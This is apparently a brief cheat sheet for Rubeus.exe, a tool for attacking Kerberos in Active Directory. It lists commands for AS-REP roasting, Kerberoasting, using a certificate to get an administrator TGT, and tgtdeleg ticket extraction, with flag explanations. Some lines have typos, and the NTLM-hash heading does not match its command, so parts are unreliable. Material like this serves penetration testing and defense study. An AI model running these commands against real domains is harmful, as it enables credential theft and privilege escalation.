What is Rubeus.exe?

Rubeus.exe is a command-line tool developed to misuse and manipulate Kerberos authentication in Windows Active Directory environments. Its main purpose is to launch different attacks based on Kerberos, including ticket-grabbing, ticket-manipulation, and pass-the-ticket attacks. Rubeus offers an interface for using Kerberos functionality to elevate privileges, impersonate users, and gain unauthorized access to resources within a compromised Active Directory environment.

Usage

1. AS-REP Roating

PS C:\Tools> .\Robeus.exe asreproast /nowrap

2. Kerberoasting

PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

3. Use pfx file to get NLTM hash (with certify.exe)

.\Rubeus.exe asktgt /user:administrator /certificate:C:\ProgramData\cert.pfx /show /nowrap
  • Requests a Kerberos TGT for administrator using certificate-based authentication (PKINIT) with the cert stored in C:\ProgramData\cert.pfx, and prints the result in a compact, no-wrapping format.
  • asktgt :
    Rubeus subcommand that asks the KDC for a TGT (Ticket Granting Ticket). Normally clients get a TGT by authenticating with a password (AS-REQ + AS-REP). With asktgt + certificate, Rubeus performs a PKINIT-based AS-REQ (certificate-based authentication).
  • /show :
    After the operation, Rubeus will show human-readable details about the ticket(s) obtained or the response from the KDC — e.g., success/failure, ticket info, encryption type, ticket blobs, etc.
  • nowrap :
    Format option that prevents Rubeus from wrapping long lines; useful when copying raw ticket data or when you need single-line outputs for scripting/parsing.

4. Retrieve a usable TGT .kirbi for the current user (w/ session key) without elevation by abusing the Kerberos GSS-API, faking delegation:

.\rubeus.exe tgtdeleg /nowrap
